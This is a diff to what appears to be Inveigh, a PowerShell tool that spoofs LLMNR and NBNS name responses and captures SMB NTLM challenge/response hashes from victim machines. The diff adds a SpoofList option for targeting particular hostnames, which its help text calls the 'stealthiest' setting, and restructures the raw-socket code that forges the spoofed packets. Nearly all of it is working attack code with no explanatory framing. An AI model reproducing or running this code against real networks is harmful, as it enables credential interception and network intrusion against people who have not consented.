@@ -26,6 +26,9 @@ Default = 00,20: Comma separated list of NBNS types to spoof. Types include 00 =
 .PARAMETER Repeat
 Default = Enabled: Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured.
 
+.PARAMETER SpoofList
+Default = All: Comma separated list of hostnames to spoof with LLMNR and NBNS.
+
 .PARAMETER HTTP
 Default = Enabled: Enable/Disable HTTP challenge/response capture.
 
@@ -102,7 +105,7 @@ Invoke-Inveigh -IP 192.168.1.10 -HTTP N
 Execute specifying a specific local listening/spoofing IP and disabling HTTP challenge/response.
 
 .EXAMPLE
-Invoke-Inveigh -Repeat N -ForceWPADAuth N
+Invoke-Inveigh -Repeat N -ForceWPADAuth N -SpoofList host1,host2
 Execute with the stealthiest options.
 
 .EXAMPLE
@@ -153,6 +156,7 @@ param
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$LLMNR="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$NBNS="N",
     [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][array]$NBNSTypes=@("00","20"),
+    [parameter(Mandatory=$false)][array]$SpoofList="",
     [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][string]$Challenge="",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelay="N",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SMBRelayTarget ="",
@@ -307,6 +311,12 @@ else
 {
     $inveigh.status_queue.add("LLMNR Spoofing Disabled")|Out-Null
     $LLMNR_response_message = "- LLMNR spoofing is disabled"
+}
+
+if($SpoofList -and ($LLMNR -eq 'y' -or $NBNS -eq 'y'))
+{
+    $spoof_list_output = $SpoofList -join ","
+    $inveigh.status_queue.add("Spoofing only $spoof_list_output")|Out-Null
 }
 
 if($NBNS -eq 'y')
@@ -816,7 +826,7 @@ $HTTP_scriptblock =
 # Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer
 $sniffer_scriptblock = 
 {
-    param ($LLMNR_response_message,$NBNS_response_message,$IP,$SpooferIP,$SMB,$LLMNR,$NBNS,$NBNSTypes,$MachineAccounts,$ForceWPADAuth,$RunTime)
+    param ($LLMNR_response_message,$NBNS_response_message,$IP,$SpooferIP,$SMB,$LLMNR,$NBNS,$NBNSTypes,$SpoofList,$MachineAccounts,$ForceWPADAuth,$RunTime)
 
     $byte_in = New-Object Byte[] 4	
     $byte_out = New-Object Byte[] 4	
@@ -863,7 +873,8 @@ $sniffer_scriptblock =
         
         switch($protocol_number)
         {
-            6 {  # TCP
+            6 
+            {  # TCP
                 $source_port = DataToUInt16 $binary_reader.ReadBytes(2)
                 $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                 $sequence_number = DataToUInt32 $binary_reader.ReadBytes(4)
@@ -874,198 +885,221 @@ $sniffer_scriptblock =
                 $TCP_checksum = [System.Net.IPAddress]::NetworkToHostOrder($binary_reader.ReadInt16())
                 $TCP_urgent_pointer = DataToUInt16 $binary_reader.ReadBytes(2)    
                 $payload_bytes = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))
+
+                switch ($destination_port)
+                {
+                    139 
+                    {
+                        if($SMB -eq 'y')
+                        {
+                            SMBNTLMResponse $payload_bytes
+                        }
+                    }
+                    445
+                    { 
+                        if($SMB -eq 'y')
+                        {
+                            SMBNTLMResponse $payload_bytes
+                        }
+                    }
+                }
+
+                # Outgoing packets
+                switch ($source_port)
+                {
+                    139 
+                    {
+                        if($SMB -eq 'y')
+                        {   
+                            $NTLM_challenge = SMBNTLMChallenge $payload_bytes
+                        }
+                    }
+                    445 
+                    {
+                        if($SMB -eq 'y')
+                        {   
+                            $NTLM_challenge = SMBNTLMChallenge $payload_bytes
+                        }
+                    }
+                }
             }       
-            17 {  # UDP
+            17 
+            {  # UDP
                 $source_port =  $binary_reader.ReadBytes(2)
-                $source_port_2 = DataToUInt16 ($source_port)
+                $endpoint_source_port = DataToUInt16 ($source_port)
                 $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                 $UDP_length = $binary_reader.ReadBytes(2)
-                $UDP_length_2  = DataToUInt16 ($UDP_length)
+                $UDP_length_uint  = DataToUInt16 ($UDP_length)
                 [void]$binary_reader.ReadBytes(2)
-                $payload_bytes = $binary_reader.ReadBytes(($UDP_length_2 - 2) * 4)
-            }
-        }
-        
-        # Incoming packets 
-        switch ($destination_port)
-        {
-            137 { # NBNS
-                if($payload_bytes[5] -eq 1)
+                $payload_bytes = $binary_reader.ReadBytes(($UDP_length_uint - 2) * 4)
+
+                # Incoming packets 
+                switch ($destination_port)
                 {
-                    try
-                    {
-                        $UDP_length[0] += 16
+                    137 # NBNS
+                    { 
+                        if($payload_bytes[5] -eq 1 -and $IP -ne $source_IP)
+                        {
+                            $UDP_length[0] += 16
                         
-                        [Byte[]] $NBNS_response_data = $payload_bytes[13..$payload_bytes.length]`
-                            + (0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00)`
-                            + ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()`
-                            + (0x00,0x00,0x00,0x00)
+                            [Byte[]]$NBNS_response_data = $payload_bytes[13..$payload_bytes.length]`
+                                + (0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00)`
+                                + ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()`
+                                + (0x00,0x00,0x00,0x00)
                 
-                        [Byte[]] $NBNS_response_packet = (0x00,0x89)`
-                            + $source_port[1,0]`
-                            + $UDP_length[1,0]`
-                            + (0x00,0x00)`
-                            + $payload_bytes[0,1]`
-                            + (0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20)`
-                            + $NBNS_response_data
+                            [Byte[]]$NBNS_response_packet = (0x00,0x89)`
+                                + $source_port[1,0]`
+                                + $UDP_length[1,0]`
+                                + (0x00,0x00)`
+                                + $payload_bytes[0,1]`
+                                + (0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20)`
+                                + $NBNS_response_data
                 
-                        $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
-                        $send_socket.SendBufferSize = 1024
-                        $destination_point = New-Object Net.IPEndpoint( $source_IP, $source_port_2 )
+                            $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
+                            $send_socket.SendBufferSize = 1024
+                            $destination_point = New-Object Net.IPEndpoint($source_IP,$endpoint_source_port)
                     
-                        $NBNS_query_type = [System.BitConverter]::ToString($payload_bytes[43..44])
+                            $NBNS_query_type = [System.BitConverter]::ToString($payload_bytes[43..44])
                     
-                        switch ($NBNS_query_type)
-                        {
-                            '41-41' {
-                                $NBNS_query_type = '00'
+                            switch ($NBNS_query_type)
+                            {
+                                '41-41' {
+                                    $NBNS_query_type = '00'
+                                }
+                                '41-44' {
+                                    $NBNS_query_type = '03'
+                                }
+                                '43-41' {
+                                    $NBNS_query_type = '20'
+                                }
+                                '42-4C' {
+                                    $NBNS_query_type = '1B'
+                                }
+                                '42-4D' {
+                                $NBNS_query_type = '1C'
+                                }
+                                '42-4E' {
+                                $NBNS_query_type = '1D'
+                                }
+                                '42-4F' {
+                                $NBNS_query_type = '1E'
+                                }
                             }
-                            '41-44' {
-                                $NBNS_query_type = '03'
+
+                            $NBNS_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.length - 4)])
+                            $NBNS_query = $NBNS_query -replace "-00",""
+                            $NBNS_query = $NBNS_query.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+                            $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
+                            $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
+                        
+                            $NBNS_query_string_subtracted = ""
+                            $NBNS_query_string = ""
+                        
+                            $n = 0
+                            
+                            do
+                            {
+                                $NBNS_query_string_sub = (([byte][char]($NBNS_query_string_encoded.Substring($n,1)))-65)
+                                $NBNS_query_string_subtracted += ([convert]::ToString($NBNS_query_string_sub,16))
+                                $n += 1
                             }
-                            '43-41' {
-                                $NBNS_query_type = '20'
+                            until($n -gt ($NBNS_query_string_encoded.Length - 1))
+                    
+                            $n = 0
+                    
+                            do
+                            {
+                                $NBNS_query_string += ([char]([convert]::toint16($NBNS_query_string_subtracted.Substring($n,2),16)))
+                                $n += 2
                             }
-                            '42-4C' {
-                                $NBNS_query_type = '1B'
-                            }
-                            '42-4D' {
-                            $NBNS_query_type = '1C'
-                            }
-                            '42-4E' {
-                            $NBNS_query_type = '1D'
-                            }
-                            '42-4F' {
-                            $NBNS_query_type = '1E'
-                            }
-                        }
-      
-                        if($NBNS -eq 'y')
-                        {
-                            if ($NBNSTypes -contains $NBNS_query_type)
-                            { 
-                                if ($inveigh.IP_capture_list -notcontains $source_IP)
-                                {
-                                    [void]$send_socket.sendTo( $NBNS_response_packet, $destination_point )
-                                    $send_socket.Close( )
-                                    $NBNS_response_message = "- spoofed response has been sent"
+                            until($n -gt ($NBNS_query_string_subtracted.Length - 1) -or $NBNS_query_string.length -eq 15)
+
+                            if($NBNS -eq 'y')
+                            {
+                                if($NBNSTypes -contains $NBNS_query_type)
+                                { 
+                                    if ((!$Spooflist -or $SpoofList -contains $NBNS_query_string) -and $inveigh.IP_capture_list -notcontains $source_IP)
+                                    {
+                                        [void]$send_socket.sendTo( $NBNS_response_packet, $destination_point )
+                                        $send_socket.Close()
+                                        $NBNS_response_message = "- spoofed response has been sent"
+                                    }
+                                    else
+                                    {
+                                        if($SpoofList -notcontains $NBNS_query_string)
+                                        {
+                                            $NBNS_response_message = "- $NBNS_query_string not on spoof list"
+                                        }
+                                        else
+                                        {
+                                            $NBNS_response_message = "- spoof suppressed due to previous capture"
+                                        }
+                                    }
                                 }
                                 else
                                 {
-                                    $NBNS_response_message = "- spoof suppressed due to previous capture"
+                                    $NBNS_response_message = "- spoof not sent due to disabled type"
                                 }
                             }
-                            else
-                            {
-                                $NBNS_response_message = "- spoof not sent due to disabled type"
-                            }
-                        }
-                
-                        $NBNS_query = [System.BitConverter]::ToString($payload_bytes[13..$payload_bytes.length])
-                        $NBNS_query = $NBNS_query -replace "-00",""
-                        $NBNS_query = $NBNS_query.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
-                        $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
-                        $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
-                        
-                        $NBNS_query_string_subtracted = ""
-                        $NBNS_query_string = ""
-                        
-                        $n = 0
-                        
-                        do
-                        {
-                            $NBNS_query_string_sub = (([byte][char]($NBNS_query_string_encoded.Substring($n,1)))-65)
-                            $NBNS_query_string_subtracted += ([convert]::ToString($NBNS_query_string_sub,16))
-                            $n += 1
-                        }
-                        until($n -gt ($NBNS_query_string_encoded.Length - 1))
-                    
-                        $n = 0
-                    
-                        do
-                        {
-                            $NBNS_query_string += ([char]([convert]::toint16($NBNS_query_string_subtracted.Substring($n,2),16)))
-                            $n += 2
-                        }
-                        until($n -gt ($NBNS_query_string_subtracted.Length - 1))
 
-                        $inveigh.console_queue.add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
-                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")])
-                    
+                            $inveigh.console_queue.add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
+                            $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")])
+                        }
                     }
-                    catch{}
-                }
-            }
-            139
-            {
-                if($SMB -eq 'y')
-                {
-                    SMBNTLMResponse $payload_bytes
-                }
-            }
-            445 { # SMB
-                if($SMB -eq 'y')
-                {
-                    SMBNTLMResponse $payload_bytes
-                }
-            }
-            5355 { # LLMNR
-                $UDP_length[0] += $payload_bytes.length - 2
-                
-                [Byte[]] $LLMNR_response_data = $payload_bytes[12..$payload_bytes.length]
-                    $LLMNR_response_data += $LLMNR_response_data`
-                    + (0x00,0x00,0x00,0x1e,0x00,0x04)`
-                    + ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()
+                    5355 # LLMNR
+                    { 
+                        if([System.BitConverter]::ToString($payload_bytes[($payload_bytes.length - 4)..($payload_bytes.length - 3)]) -ne '00-1c') # ignore AAAA for now
+                        {
+                            $UDP_length[0] += $payload_bytes.length - 2
+
+                            [byte[]]$LLMNR_response_data = $payload_bytes[12..$payload_bytes.length]
+                                $LLMNR_response_data += $LLMNR_response_data`
+                                + (0x00,0x00,0x00,0x1e)`
+                                + (0x00,0x04)`
+                                + ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()
             
-                [Byte[]] $LLMNR_response_packet = (0x14,0xeb)`
-                    + $source_port[1,0]`
-                    + $UDP_length[1,0]`
-                    + (0x00,0x00)`
-                    + $payload_bytes[0,1]`
-                    + (0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00)`
-                    + $LLMNR_response_data
+                            [byte[]]$LLMNR_response_packet = (0x14,0xeb)`
+                                + $source_port[1,0]`
+                                + $UDP_length[1,0]`
+                                + (0x00,0x00)`
+                                + $payload_bytes[0,1]`
+                                + (0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00)`
+                                + $LLMNR_response_data
             
-                $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
-                $send_socket.SendBufferSize = 1024
-                $destination_point = New-Object Net.IPEndpoint( $source_IP, $source_port_2 )
+                            $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
+                            $send_socket.SendBufferSize = 1024
+                            $destination_point = New-Object Net.IPEndpoint($source_IP, $endpoint_source_port)
      
-                if($LLMNR -eq 'y')
-                {
-                    if ($inveigh.IP_capture_list -notcontains $source_IP)
-                    {
-                        [void]$send_socket.sendTo( $LLMNR_response_packet, $destination_point )
-                        $send_socket.Close( )
-                        $LLMNR_response_message = "- spoofed response has been sent"
-                    }
-                    else
-                    {
-                        $LLMNR_response_message = "- spoof suppressed due to previous capture"
-                    }
-                }
+                            $LLMNR_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.length - 4)])
+                            $LLMNR_query = $LLMNR_query -replace "-00",""
+                            $LLMNR_query = $LLMNR_query.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+                            $LLMNR_query_string = New-Object System.String ($LLMNR_query,0,$LLMNR_query.Length)
                 
-                $LLMNR_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.length - 4)])
-                $LLMNR_query = $LLMNR_query -replace "-00",""
-                $LLMNR_query = $LLMNR_query.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
-                $LLMNR_query_string = New-Object System.String ($LLMNR_query,0,$LLMNR_query.Length)
+                            if($LLMNR -eq 'y')
+                            {
+                                if((!$Spooflist -or $SpoofList -contains $LLMNR_query_string) -and $inveigh.IP_capture_list -notcontains $source_IP)
+                                {
+                                    [void]$send_socket.sendTo( $LLMNR_response_packet, $destination_point )
+                                    $send_socket.Close( )
+                                    $LLMNR_response_message = "- spoofed response has been sent"
+                                }
+                                else
+                                {
+                                    if($SpoofList -notcontains $LLMNR_query_string)
+                                    {
+                                        $LLMNR_response_message = "- $LLMNR_query_string not on spoof list"
+                                    }
+                                    else
+                                    {
+                                        $LLMNR_response_message = "- spoof suppressed due to previous capture"
+                                    }
+                                }
+                            }
              
-                $inveigh.console_queue.add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
-                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")])
-            }
-        }
-        
-        # Outgoing packets
-        switch ($source_port)
-        {
-            139 {
-                if($SMB -eq 'y')
-                {   
-                    $NTLM_challenge = SMBNTLMChallenge $payload_bytes
-                }
-            }
-            445 { # SMB
-                if($SMB -eq 'y')
-                {   
-                    $NTLM_challenge = SMBNTLMChallenge $payload_bytes
+                            $inveigh.console_queue.add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
+                            $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")])
+                        }
+                    }
                 }
             }
         }
@@ -1199,7 +1233,7 @@ Function SnifferSpoofer()
     $sniffer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
     $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($LLMNR_response_message).AddArgument(
         $NBNS_response_message).AddArgument($IP).AddArgument($SpooferIP).AddArgument($SMB).AddArgument(
-        $LLMNR).AddArgument($NBNS).AddArgument($NBNSTypes).AddArgument(
+        $LLMNR).AddArgument($NBNS).AddArgument($NBNSTypes).AddArgument($SpoofList).AddArgument(
         $MachineAccounts).AddArgument($ForceWPADAuth).AddArgument($RunTime) > $null
     $sniffer_handle = $sniffer_powershell.BeginInvoke()
 }
